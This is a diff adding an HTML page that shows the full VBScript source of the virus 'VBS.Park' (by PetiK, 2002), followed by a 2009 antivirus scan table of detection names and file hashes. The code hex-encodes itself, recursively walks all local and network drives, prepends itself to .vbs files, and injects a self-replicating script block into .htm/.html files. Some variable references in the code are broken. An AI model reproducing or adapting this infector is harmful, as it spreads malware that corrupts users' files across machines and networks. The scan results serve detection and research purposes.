@@ -1,0 +1,164 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>20020624 - VBS.Park</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+}
+.sc7 {
+}
+.sc11 {
+}
+.sc12 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">' Name : VBS.Park
+' Author : PetiK
+' Language : VBS
+' Date : 24/06/2002
+</span><span class="sc0">
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc11">fs</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ws</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fl</span><span class="sc6">=</span><span class="sc7">fs.OpenTextFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullName</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">virus</span><span class="sc6">=</span><span class="sc7">fl.ReadAll</span><span class="sc0">
+</span><span class="sc7">fl.Close</span><span class="sc0">
+
+</span><span class="sc7">f</span><span class="sc6">=</span><span class="sc4">"virhex="""</span><span class="sc0">
+
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">=</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">virus</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">e</span><span class="sc6">=</span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">virus</span><span class="sc6">,</span><span class="sc7">i</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">e</span><span class="sc6">=</span><span class="sc7">Hex</span><span class="sc6">(</span><span class="sc7">Asc</span><span class="sc6">(</span><span class="sc7">e</span><span class="sc6">))</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">e</span><span class="sc6">)=</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">e</span><span class="sc6">=</span><span class="sc4">"0"</span><span class="sc6">&amp;</span><span class="sc7">e</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc7">f</span><span class="sc6">=</span><span class="sc7">f</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">e</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+
+</span><span class="sc7">f</span><span class="sc6">=</span><span class="sc7">f</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0">
+
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">drv</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">fs.Drives</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">drv.DriveType</span><span class="sc6">=</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">drv.DriveType</span><span class="sc6">=</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">list</span><span class="sc6">(</span><span class="sc7">drv.path&amp;</span><span class="sc4">"\"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">list</span><span class="sc6">(</span><span class="sc7">dir</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">ssf</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">fs.GetFolder</span><span class="sc6">(</span><span class="sc7">dir</span><span class="sc6">).</span><span class="sc7">SubFolders</span><span class="sc0">
+</span><span class="sc7">infect</span><span class="sc6">(</span><span class="sc7">ssf.path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">list</span><span class="sc6">(</span><span class="sc7">ssf.path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">infect</span><span class="sc6">(</span><span class="sc7">dir</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">fil</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">fs.GetFolder</span><span class="sc6">(</span><span class="sc7">dir</span><span class="sc6">).</span><span class="sc7">Files</span><span class="sc0">
+</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc7">lcase</span><span class="sc6">(</span><span class="sc7">fs.GetExtensionName</span><span class="sc6">(</span><span class="sc7">fil.path</span><span class="sc6">))</span><span class="sc0">
+
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"vbs"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">vb</span><span class="sc6">=</span><span class="sc7">fs.OpenTextFile</span><span class="sc6">(</span><span class="sc7">Q.path</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">vb.ReadLine</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc1">'VBS.Park"" Then
+</span><span class="sc7">vbsorg</span><span class="sc6">=</span><span class="sc7">vb.ReadAll</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">vb.Close</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">vb</span><span class="sc6">=</span><span class="sc7">fs.OpenTextFile</span><span class="sc6">(</span><span class="sc7">Q.path</span><span class="sc6">,</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">vb.WriteLine</span><span class="sc0"> </span><span class="sc7">read</span><span class="sc6">(</span><span class="sc7">virhex</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">vb.WriteLine</span><span class="sc0"> </span><span class="sc7">vbsorg</span><span class="sc0">
+</span><span class="sc7">vb.Close</span><span class="sc0">
+</span><span class="sc3">Else</span><span class="sc0">
+</span><span class="sc7">vb.Close</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+</span><span class="sc3">ElseIf</span><span class="sc0"> </span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"htm"</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"html"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ht</span><span class="sc6">=</span><span class="sc7">fs.OpentextFile</span><span class="sc6">(</span><span class="sc7">P.path</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">htmf</span><span class="sc6">=</span><span class="sc7">ht.ReadAll</span><span class="sc0">
+</span><span class="sc7">ht.Close</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc12">InStr</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">,</span><span class="sc7">htmf</span><span class="sc6">,</span><span class="sc4">"virhex"</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ht</span><span class="sc6">=</span><span class="sc7">fs.OpentextFile</span><span class="sc6">(</span><span class="sc7">P.path</span><span class="sc6">,</span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ht.WriteBlankLines</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"&lt;SCRIPT LANGUAGE=VBScript&gt;"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Set fs=CreateObject(""Scripting.FileSystemObject"")"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Set ws=CreateObject(""WScript.Shell"")"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Infect(fso.GetSpecialFolder(0))"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Infect(fso.GetSpecialFolder(1))"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Infect(fso.GetSpecialFolder(2))"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Infect(""C:\"")"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Infect(ws.SpecialFolders(""MyDocuments""))"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Infect(ws.SpecialFolders(""Desktop""))"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Infect(ws.SpecialFolders(""Favorites""))"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Sub Infect(dir)"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"For each Q in fs.GetFolder(dir).Files"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"ext=lcase(fs.GetExtensionName(Q.Name))"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"If ext=""vbs"" Then"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Set vb=fs.OpenTextFile(Q.path,1)"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"If vb.ReadLine &lt;&gt; ""'VBS.Park"" Then"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"vbsorg=vb.ReadAll()"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"vb.Close"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Set vb=fs.OpenTextFile(Q.path,2)"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"vb.WriteLine read(virhex)"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"vb.WriteLine vbsorg"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"vb.Close"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Else"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"vb.Close"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"End If"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"End If"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"If ext=""htm"" or ext=""html"" Then"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Set ht=fs.OpenTextFile(Q.Path,1)"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"If ht.ReadLine &lt;&gt; ""&lt;vbshtmpark&gt;"" Then"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"htmorg=ht.ReadAll()"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"ht.Close"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Set ht=fs.CreateTextFile(Q.Path,2)"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"ht.WriteLine ""&lt;vbshtmpark&gt;"""</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"ht.Write(htmorg)"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"ht.WriteLine document.body.CreateTextRange.htmltext"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"ht.Close"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Else"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"ht.Close"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"End If"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"End If"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Next"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"End Sub"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Function read(octet)"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"For hexa=1 To Len(octet) Step 2"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"read=read &amp; Chr(""&amp;h"" &amp; Mid(octet, hexa, 2))"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"Next"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"End Function"</span><span class="sc0">
+</span><span class="sc7">ht.WriteLine</span><span class="sc0"> </span><span class="sc4">"&lt;/SCRIPT&gt;"</span><span class="sc0">
+</span><span class="sc7">ht.Close</span><span class="sc0">
+
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc7">Sub</span>
+
+<span class="sc0"><table border="1"><tr><td colspan="4">File Park.vbs received on 2009.06.10 04:57:42 (UTC)</td></tr><tr><td>Antivirus</td><td>Version</td><td>Last Update</td><td>Result</td</tr><tr><td>a-squared</td><td>4.5.0.18</td><td>2009.06.10</td><td style="color: red;">Virus.VBS.Petik!IK</td</tr><tr><td>AhnLab-V3</td><td>5.0.0.2</td><td>2009.06.10</td><td style="color: red;">VBS/Park</td</tr><tr><td>AntiVir</td><td>7.9.0.183</td><td>2009.06.09</td><td style="color: red;">Worm/Alcaul.U3</td</tr><tr><td>Antiy-AVL</td><td>2.0.3.1</td><td>2009.06.10</td><td>-</td</tr><tr><td>Authentium</td><td>5.1.2.4</td><td>2009.06.10</td><td style="color: red;">VBS/Park.A</td</tr><tr><td>Avast</td><td>4.8.1335.0</td><td>2009.06.09</td><td style="color: red;">VBS:Malware-gen</td</tr><tr><td>AVG</td><td>8.5.0.339</td><td>2009.06.09</td><td style="color: red;">VBS/Park</td</tr><tr><td>BitDefender</td><td>7.2</td><td>2009.06.10</td><td style="color: red;">VBS.Park.A</td</tr><tr><td>CAT-QuickHeal</td><td>10.00</td><td>2009.06.10</td><td>-</td</tr><tr><td>ClamAV</td><td>0.94.1</td><td>2009.06.10</td><td>-</td</tr><tr><td>Comodo</td><td>1299</td><td>2009.06.10</td><td style="color: red;">Unclassified Malware</td</tr><tr><td>DrWeb</td><td>5.0.0.12182</td><td>2009.06.10</td><td style="color: red;">VBS.Generic.42</td</tr><tr><td>eSafe</td><td>7.0.17.0</td><td>2009.06.09</td><td>-</td</tr><tr><td>eTrust-Vet</td><td>31.6.6550</td><td>2009.06.09</td><td style="color: red;">VBS/Park!intended</td</tr><tr><td>F-Prot</td><td>4.4.4.56</td><td>2009.06.10</td><td style="color: red;">VBS/Park.A</td</tr><tr><td>F-Secure</td><td>8.0.14470.0</td><td>2009.06.09</td><td style="color: red;">Virus.VBS.Petik</td</tr><tr><td>Fortinet</td><td>3.117.0.0</td><td>2009.06.09</td><td style="color: red;">VBS/Petik.A</td</tr><tr><td>GData</td><td>19</td><td>2009.06.10</td><td style="color: red;">VBS.Park.A</td</tr><tr><td>Ikarus</td><td>T3.1.1.59.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>K7AntiVirus</td><td>7.10.757</td><td>2009.06.08</td><td>-</td</tr><tr><td>Kaspersky</td><td>7.0.0.125</td><td>2009.06.10</td><td style="color: red;">Virus.VBS.Petik</td</tr><tr><td>McAfee</td><td>5641</td><td>2009.06.09</td><td style="color: red;">VBS/Park.b.intd</td</tr><tr><td>McAfee+Artemis</td><td>5641</td><td>2009.06.09</td><td style="color: red;">VBS/Park.b.intd</td</tr><tr><td>McAfee-GW-Edition</td><td>6.7.6</td><td>2009.06.10</td><td style="color: red;">Worm.Alcaul.U3</td</tr><tr><td>Microsoft</td><td>1.4701</td><td>2009.06.10</td><td style="color: red;">Virus:VBS/Park.gen</td</tr><tr><td>NOD32</td><td>4142</td><td>2009.06.09</td><td style="color: red;">probably unknown SCRIPT</td</tr><tr><td>Norman</td><td>6.01.09</td><td>2009.06.09</td><td style="color: red;">VBS/Petik.H</td</tr><tr><td>nProtect</td><td>2009.1.8.0</td><td>2009.06.10</td><td style="color: red;">VBS.Intended.Park.A</td</tr><tr><td>Panda</td><td>10.0.0.14</td><td>2009.06.09</td><td>-</td</tr><tr><td>PCTools</td><td>4.4.2.0</td><td>2009.06.09</td><td style="color: red;">VBS.Park.A</td</tr><tr><td>Prevx</td><td>3.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>Rising</td><td>21.33.20.00</td><td>2009.06.10</td><td style="color: red;">VBS.Dara</td</tr><tr><td>Sophos</td><td>4.42.0</td><td>2009.06.10</td><td style="color: red;">Junk/Park-A</td</tr><tr><td>Sunbelt</td><td>3.2.1858.2</td><td>2009.06.09</td><td>-</td</tr><tr><td>Symantec</td><td>1.4.4.12</td><td>2009.06.10</td><td style="color: red;">VBS.Dara</td</tr><tr><td>TheHacker</td><td>6.3.4.3.342</td><td>2009.06.10</td><td>-</td</tr><tr><td>TrendMicro</td><td>8.950.0.1092</td><td>2009.06.09</td><td style="color: red;">VBS_Parade.a</td</tr><tr><td>VBA32</td><td>3.12.10.7</td><td>2009.06.10</td><td style="color: red;">Virus.VBS.Petik</td</tr><tr><td>ViRobot</td><td>2009.6.9.1775</td><td>2009.06.09</td><td style="color: red;">VBS.Park</td</tr><tr><td>VirusBuster</td><td>4.6.5.0</td><td>2009.06.09</td><td style="color: red;">VBS.Park.A</td</tr><tr><td colspan="4">&nbsp;</td></tr><tr><td colspan="4">Additional information</td></tr><tr><td colspan="4">File size: 3107 bytes</td></tr><tr><td colspan="4">MD5...: cfa6d1d7f6e6223bfdf9ae6350cc05b0</td></tr><tr><td colspan="4">SHA1..: 8d988bc367ce0b20adcc177f2b73764a233d77cb</td></tr><tr><td colspan="4">SHA256: c67e38cf7b37519d8663d89f16f5a170e42e76938e6712837dabcadc5af0cfe8</td></tr><tr><td colspan="4">ssdeep: -<br></td></tr><tr><td colspan="4">PEiD..: -</td></tr><tr><td colspan="4">TrID..: File type identification<br>Unknown!</td></tr><tr><td colspan="4">PEInfo: -</td></tr><tr><td colspan="4">PDFiD.: -</td></tr><tr><td colspan="4">RDS...: NSRL Reference Data Set<br>-</td></tr></table></span>
+</div></body>
+</html>
